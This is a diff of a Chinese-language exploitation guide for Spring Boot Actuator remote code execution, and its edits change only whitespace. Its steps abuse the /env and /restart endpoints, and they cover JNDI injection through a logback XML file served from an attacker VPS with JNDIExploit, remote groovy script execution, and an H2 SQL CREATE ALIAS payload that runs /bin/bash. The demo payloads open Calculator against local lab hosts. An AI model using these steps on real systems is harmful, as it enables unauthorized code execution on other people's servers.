 ##### 步骤六：恢复正常 jdbc url
 
-反序列化漏洞利用完成后，使用 步骤三 的方法恢复 步骤一 中记录的 `spring.datasource.url` 的原始 `value` 值
+反序列化漏洞利用完成后，使用 步骤三 的方法恢复 步骤一 中记录的 `spring.datasource.url` 的原始 `value` 值
 
 #### 漏洞原理：
 
@@ -1620,7 +1620,7 @@ Content-Type: application/json
 
 #### 漏洞分析：
 
- New-Exploit-Technique-In-Java-Deserialization-Attack
+ New-Exploit-Technique-In-Java-Deserialization-Attack
 
 #### 漏洞环境：
 
@@ -1648,23 +1648,23 @@ http://127.0.0.1:9097/product/list
 
 #### 利用条件：
 
-*   可以 POST 请求目标网站的 `/env` 接口设置属性
+*   可以 POST 请求目标网站的 `/env` 接口设置属性
     
-*   可以 POST 请求目标网站的 `/restart` 接口重启应用
+*   可以 POST 请求目标网站的 `/restart` 接口重启应用
     
 *   普通 JNDI 注入受目标 JDK 版本影响，jdk <6u201/7u191/8u182/11.0.1(LDAP)，但相关环境可绕过
     
 *   ⚠️
     
-     目标可以请求攻击者的 HTTP 服务器（请求可出外网），否则 restart 会导致程序异常退出
+     目标可以请求攻击者的 HTTP 服务器（请求可出外网），否则 restart 会导致程序异常退出
     
 *   ⚠️
     
-     HTTP 服务器如果返回含有畸形 xml 语法内容的文件，会导致程序异常退出
+     HTTP 服务器如果返回含有畸形 xml 语法内容的文件，会导致程序异常退出
     
 *   ⚠️
     
-     JNDI 服务返回的 object 需要实现 `javax.naming.spi.ObjectFactory` 接口，否则会导致程序异常退出
+     JNDI 服务返回的 object 需要实现 `javax.naming.spi.ObjectFactory` 接口，否则会导致程序异常退出
     
 
 #### 利用方法：
@@ -1681,7 +1681,7 @@ python3 -m http.server 80
 
 ```
 
-在根目录放置以 `xml` 结尾的 `example.xml` 文件，实际内容要根据步骤二中使用的 JNDI 服务来确定：
+在根目录放置以 `xml` 结尾的 `example.xml` 文件，实际内容要根据步骤二中使用的 JNDI 服务来确定：
 
 ```
 <configuration>
@@ -1692,7 +1692,7 @@ python3 -m http.server 80
 
 ##### 步骤二：托管恶意 ldap 服务及代码
 
-参考文章，修改 JNDIExploit 并启动（也可以使用其他方法）：
+参考文章，修改 JNDIExploit 并启动（也可以使用其他方法）：
 
 ```
 java -jar JNDIExploit-1.0-SNAPSHOT.jar -i your-vps-ip
@@ -1753,16 +1753,16 @@ Content-Type: application/json
     
 3.  目标机器使用 saxParser.parse 解析 xml 文件 (这里导致了 xxe 漏洞)
     
-4.  xml 文件中利用 `logback` 依赖的 `insertFormJNDI` 标签，设置了外部 JNDI 服务器地址
+4.  xml 文件中利用 `logback` 依赖的 `insertFormJNDI` 标签，设置了外部 JNDI 服务器地址
     
 5.  目标机器请求恶意 JNDI 服务器，导致 JNDI 注入，造成 RCE 漏洞
     
 
 #### 漏洞分析：
 
- spring boot actuator rce via jolokia
+ spring boot actuator rce via jolokia
 
- https://landgrey.me/blog/21/
+ https://landgrey.me/blog/21/
 
 #### 漏洞环境：
 
@@ -1780,21 +1780,21 @@ http://127.0.0.1:9098/actuator/env
 
 #### 利用条件：
 
-*   可以 POST 请求目标网站的 `/env` 接口设置属性
+*   可以 POST 请求目标网站的 `/env` 接口设置属性
     
-*   可以 POST 请求目标网站的 `/restart` 接口重启应用
-    
-*   ⚠️
-    
-     目标可以请求攻击者的 HTTP 服务器（请求可出外网），否则 restart 会导致程序异常退出
+*   可以 POST 请求目标网站的 `/restart` 接口重启应用
     
 *   ⚠️
     
-     HTTP 服务器如果返回含有畸形 groovy 语法内容的文件，会导致程序异常退出
+     目标可以请求攻击者的 HTTP 服务器（请求可出外网），否则 restart 会导致程序异常退出
     
 *   ⚠️
     
-     环境中需要存在 groovy 依赖，否则会导致程序异常退出
+     HTTP 服务器如果返回含有畸形 groovy 语法内容的文件，会导致程序异常退出
+    
+*   ⚠️
+    
+     环境中需要存在 groovy 依赖，否则会导致程序异常退出
     
 
 #### 利用方法：
@@ -1811,7 +1811,7 @@ python3 -m http.server 80
 
 ```
 
-在根目录放置以 `groovy` 结尾的 `example.groovy` 文件，内容为需要执行的 groovy 代码，比如：
+在根目录放置以 `groovy` 结尾的 `example.groovy` 文件，内容为需要执行的 groovy 代码，比如：
 
 ```
 Runtime.getRuntime().exec("open -a Calculator")
@@ -1871,9 +1871,9 @@ Content-Type: application/json
     
 2.  restart 重启应用后，程序会请求设置的 URL 地址
     
-3.  `logback-classic` 组件的 `ch.qos.logback.classic.util.ContextInitializer.java` 代码文件逻辑中会判断 url 是否以 `groovy` 结尾
+3.  `logback-classic` 组件的 `ch.qos.logback.classic.util.ContextInitializer.java` 代码文件逻辑中会判断 url 是否以 `groovy` 结尾
     
-4.  如果 url 以 `groovy` 结尾，则最终会执行文件内容中的 groovy 代码，造成 RCE 漏洞
+4.  如果 url 以 `groovy` 结尾，则最终会执行文件内容中的 groovy 代码，造成 RCE 漏洞
     
 
 #### 漏洞环境：
@@ -1892,21 +1892,21 @@ http://127.0.0.1:9098/actuator/env
 
 #### 利用条件：
 
-*   可以 POST 请求目标网站的 `/env` 接口设置属性
+*   可以 POST 请求目标网站的 `/env` 接口设置属性
     
-*   可以 POST 请求目标网站的 `/restart` 接口重启应用
-    
-*   ⚠️
-    
-     目标可以请求攻击者的 HTTP 服务器（请求可出外网），否则 restart 会导致程序异常退出
+*   可以 POST 请求目标网站的 `/restart` 接口重启应用
     
 *   ⚠️
     
-     HTTP 服务器如果返回含有畸形 groovy 语法内容的文件，会导致程序异常退出
+     目标可以请求攻击者的 HTTP 服务器（请求可出外网），否则 restart 会导致程序异常退出
     
 *   ⚠️
     
-     环境中需要存在 groovy 依赖，否则会导致程序异常退出
+     HTTP 服务器如果返回含有畸形 groovy 语法内容的文件，会导致程序异常退出
+    
+*   ⚠️
+    
+     环境中需要存在 groovy 依赖，否则会导致程序异常退出
     
 
 #### 利用方法：
@@ -1923,7 +1923,7 @@ python3 -m http.server 80
 
 ```
 
-在根目录放置以 `groovy` 结尾的 `example.groovy` 文件，内容为需要执行的 groovy 代码，比如：
+在根目录放置以 `groovy` 结尾的 `example.groovy` 文件，内容为需要执行的 groovy 代码，比如：
 
 ```
 Runtime.getRuntime().exec("open -a Calculator")
@@ -1983,9 +1983,9 @@ Content-Type: application/json
     
 2.  restart 重启应用后，程序会请求设置的 URL 地址
     
-3.  `spring-boot` 组件中的 `org.springframework.boot.BeanDefinitionLoader.java` 文件代码逻辑中会判断 url 是否以 `.groovy` 结尾
+3.  `spring-boot` 组件中的 `org.springframework.boot.BeanDefinitionLoader.java` 文件代码逻辑中会判断 url 是否以 `.groovy` 结尾
     
-4.  如果 url 以 `.groovy` 结尾，则最终会执行文件内容中的 groovy 代码，造成 RCE 漏洞
+4.  如果 url 以 `.groovy` 结尾，则最终会执行文件内容中的 groovy 代码，造成 RCE 漏洞
     
 
 #### 漏洞环境：
@@ -2004,19 +2004,19 @@ http://127.0.0.1:9098/actuator/env
 
 #### 利用条件：
 
-*   可以 POST 请求目标网站的 `/env` 接口设置属性
+*   可以 POST 请求目标网站的 `/env` 接口设置属性
     
-*   可以 POST 请求目标网站的 `/restart` 接口重启应用
+*   可以 POST 请求目标网站的 `/restart` 接口重启应用
     
-*   环境中需要存在 `h2database`、`spring-boot-starter-data-jpa` 相关依赖
-    
-*   ⚠️
-    
-     目标可以请求攻击者的 HTTP 服务器（请求可出外网），否则 restart 会导致程序异常退出
+*   环境中需要存在 `h2database`、`spring-boot-starter-data-jpa` 相关依赖
     
 *   ⚠️
     
-     HTTP 服务器如果返回含有畸形 h2 sql 语法内容的文件，会导致程序异常退出
+     目标可以请求攻击者的 HTTP 服务器（请求可出外网），否则 restart 会导致程序异常退出
+    
+*   ⚠️
+    
+     HTTP 服务器如果返回含有畸形 h2 sql 语法内容的文件，会导致程序异常退出
     
 
 #### 利用方法：
@@ -2035,7 +2035,7 @@ python3 -m http.server 80
 
 在根目录放置以任意名字的文件，内容为需要执行的 h2 sql 代码，比如：
 
-> ⚠️ 下面 payload 中的'T5' 方法只能 restart 执行一次；后面 restart 需要更换新的方法名称 (如 T6) 和设置新的 sql URL 地址，然后才能被 restart 重新使用，否则第二次 restart 重启应用时会导致程序异常退出
+> ⚠️ 下面 payload 中的'T5' 方法只能 restart 执行一次；后面 restart 需要更换新的方法名称 (如 T6) 和设置新的 sql URL 地址，然后才能被 restart 重新使用，否则第二次 restart 重启应用时会导致程序异常退出
 
 ```
 CREATE ALIAS T5 AS CONCAT('void ex(String m1,String m2,String m3)throws Exception{Runti','me.getRun','time().exe','c(new String[]{m1,m2,m3});}');CALL T5('/bin/bash','-c','open -a Calculator');
@@ -2094,7 +2094,7 @@ Content-Type: application/json
     
 2.  restart 重启应用后，程序会请求设置的 URL 地址
     
-3.  `spring-boot-autoconfigure` 组件中的 `org.springframework.boot.autoconfigure.jdbc.DataSourceInitializer.java` 文件代码逻辑中会使用 `runScripts` 方法执行请求 URL 内容中的 h2 database sql 代码，造成 RCE 漏洞
+3.  `spring-boot-autoconfigure` 组件中的 `org.springframework.boot.autoconfigure.jdbc.DataSourceInitializer.java` 文件代码逻辑中会使用 `runScripts` 方法执行请求 URL 内容中的 h2 database sql 代码，造成 RCE 漏洞
     
 
 #### 漏洞环境：
